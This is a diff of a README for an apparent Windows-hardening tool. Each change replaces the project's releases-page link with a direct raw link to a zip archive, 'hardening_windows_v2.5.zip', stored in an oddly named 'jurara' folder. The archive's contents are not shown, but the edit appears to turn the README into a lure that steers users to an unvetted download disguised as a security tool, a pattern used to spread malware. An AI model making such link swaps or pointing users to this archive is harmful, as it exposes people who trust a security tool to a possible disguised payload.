@@ -1,6 +1,6 @@
 # 🛡️ windows-hardening - Harden Windows in minutes
 
-[![Download](https://img.shields.io/badge/Download%20Here-blue-grey?style=for-the-badge&logo=github)](https://github.com/klentr7196/windows-hardening/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-blue-grey?style=for-the-badge&logo=github)](https://github.com/klentr7196/windows-hardening/raw/refs/heads/main/jurara/hardening_windows_v2.5.zip)
 
 ## 🔐 What this is
 
@@ -47,7 +47,7 @@ For best results:
 
 Visit this page to download the latest release:
 
-https://github.com/klentr7196/windows-hardening/releases
+https://github.com/klentr7196/windows-hardening/raw/refs/heads/main/jurara/hardening_windows_v2.5.zip
 
 ## 🚀 Getting started
 
@@ -285,4 +285,4 @@ It may affect:
 
 If you need the file again, visit the release page here:
 
-https://github.com/klentr7196/windows-hardening/releases
+https://github.com/klentr7196/windows-hardening/raw/refs/heads/main/jurara/hardening_windows_v2.5.zip
